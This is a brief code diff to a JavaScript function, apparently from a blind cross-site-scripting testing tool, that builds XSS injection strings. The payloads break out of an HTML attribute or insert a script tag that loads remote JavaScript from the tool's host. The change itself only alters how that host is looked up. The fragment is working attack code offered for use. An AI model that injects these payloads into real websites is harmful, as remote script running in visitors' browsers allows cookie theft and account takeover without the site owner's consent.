@@ -97,7 +97,7 @@ $(function(){
 });
 
 function show_payloads(){
-	var domain = document.domain;
+	var domain = document.location.host;
 	var payloads = [
 		'"><script src="https://' + domain + '"></script>',
 		'<script>$.getScript("//' + domain + '")</script>',
